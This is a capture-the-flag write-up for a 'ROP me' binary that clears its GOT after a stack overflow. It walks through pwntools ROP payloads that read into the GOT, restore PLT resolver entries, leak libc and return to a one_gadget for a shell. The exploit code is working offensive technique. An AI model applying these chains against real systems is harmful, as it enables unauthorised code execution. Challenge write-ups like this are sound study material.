We are given a binary, that reads out input, clears the GOT table and somehow we need to get a shell.

```c
undefined8 main(void)
{
  undefined buff [80];
  puts("ROP me ;)");
  printf("> ");
  read(0,buff,0xf0);
  clear_got();
  return 0;
}
```

The function ```clear_got``` does exactly what we expect it to do, it uses ```memeset`` to set the entire GOT to 0.

In addition, we have a very usefull gadget in one of the setup functions:
```asm
00401283 0f 05      SYSCALL
00401285 c3         RET
```

### The vulnerability
It is obvious we can overflow ```buff``` and like in the challenge ```echo```,
we keep out eyes peeled for a way to abuse the syscall gadaget.

However, is it not a trivial rop chain, because we can't immediatly return to ```plt``` functions.
So, after a quick research about dynamic linking, I figured out the following, 
the GOT entry for any function, say ```printf```, by default is pointing to ```plt.printf + 0x6```
At that address lays the dynamic linking routine for ```printf```.
If we can set all the zeroed GOT entries to some resolving function in the ```plt``` section, we can reload the GOT entries.


### 1. Setting up conditions for restoring the GOT:
```python
payload = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(got_start) + p64(0) + p64(syscall_ret) +\
p64(elf.sym.main)
payload = 0x58*b"A"+payload
p.sendline(payload)
```
We have a rop chain that loads ```rdi = 0, rsi = &GOT``` and returns to a syscall, and to main afterwards.
Since main returns 0, by the time we are executing the rop chain ```rax = 0``` which is the syscall number for ```read```.
At the time we syscall, we will actually read back into the GOT table.

### 2. Rewriting GOT table:
The GOT entries in the binary are in the following order: [puts, setbuf, printf, memset, alarm, read, signal]
```python
payload = p64(elf.sym.plt["puts"]+6) + p64(elf.sym.plt["setbuf"]+6) + p64(elf.sym.plt["puts"]+6) +\
	p64(elf.sym.plt["puts"]+6) + p64(elf.sym.plt["alarm"]+6) + p64(elf.sym.plt["read"]+6) +\
	p64(elf.sym.plt["signal"]+6)
p.sendline(payload)
```
So, we load the appropriate ```plt``` values into the GOT, but we can't just load them the same way, 
because memset will zero them again, so we just patch the GOT entry for memset with ```plt.puts```.
Now, by the time we return to ```main``` the function will resolve their addresses based on the ```plt``` values that are in the GOT tablle.


### 3. Leak libc:
We now have a "stable" binary that won't erase the GOT on us, and we can just leak libc with a simple rop chain:
```python
payload = p64(pop_rdi) + p64(elf.sym.got["puts"]) + p64(elf.sym.plt["puts"]) + p64(elf.sym.main)
```

### 4. Get shell:
We have a one_gadget at ```0x448a3``` offset, we can just return to that with another rop chain.
```python
p.sendline(0x58*b"C" + p64(libc.address + one_shot_offset) + b"\x00"*0x100) 
```
